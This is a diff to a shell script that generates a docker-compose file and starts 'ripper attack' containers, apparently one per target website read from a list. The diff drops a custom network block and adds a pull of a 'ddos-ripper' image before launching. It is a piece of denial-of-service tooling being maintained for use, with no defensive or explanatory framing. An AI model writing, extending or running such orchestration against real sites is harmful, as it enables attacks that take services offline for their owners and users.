@@ -18,12 +18,6 @@ function check_params {
 
 function generate_compose {
     echo -e "version: '3'" > docker-compose.yml
-    echo -e "networks:" >> docker-compose.yml
-    echo -e "  default:" >> docker-compose.yml
-    echo -e "    driver: bridge" >> docker-compose.yml
-    echo -e "    ipam:" >> docker-compose.yml
-    echo -e "      config:" >> docker-compose.yml
-    echo -e "        - subnet: 10.10.1.0/24" >> docker-compose.yml
     echo -e "services:" >> docker-compose.yml
     counter=1
     while read -r site_url; do
@@ -39,6 +33,7 @@ function generate_compose {
 
 function ripper_start {
   echo "Starting ripper attack"
+  docker pull nitupkcuf/ddos-ripper
   docker-compose up -d
 }
 
